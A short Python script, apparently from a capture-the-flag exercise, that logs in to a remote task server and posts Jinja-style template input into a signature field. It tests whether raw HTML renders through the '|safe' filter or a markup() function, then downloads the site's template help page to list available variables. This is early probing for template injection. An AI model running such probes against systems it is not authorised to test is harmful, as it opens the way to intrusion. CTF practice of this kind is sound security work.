import requests

TARGET = "http://tasks.4x10m.ru:20796"

def test_safe():
    s = requests.Session()
    s.post(f"{TARGET}/register", data={"username": "tester", "password": "123"})
    s.post(f"{TARGET}/login", data={"username": "tester", "password": "123"})
    
    # Kita tes 2 cara render HTML
    payload = "SAFE_FILTER: {{ '<b>BOLD</b>'|safe }} | MARKUP_FUNC: {{ markup('<i>ITALIC</i>') if markup is defined else 'NA' }}"
    s.post(f"{TARGET}/dashboard", data={"signature_template": payload})
    
    res = s.get(f"{TARGET}/dashboard")
    print("\n--- HASIL RENDER ---")
    if "<b>BOLD</b>" in res.text: print("[+] Filter |safe BERHASIL!")
    if "<i>ITALIC</i>" in res.text: print("[+] Fungsi markup() BERHASIL!")
    
    # Ambil konten bantuan untuk melihat variabel apa saja yang tersedia
    help_page = s.get(f"{TARGET}/help/templates").text
    print("\n--- ISI CHEAT SHEET ---")
    print(help_page)

if __name__ == '__main__':
    test_safe()
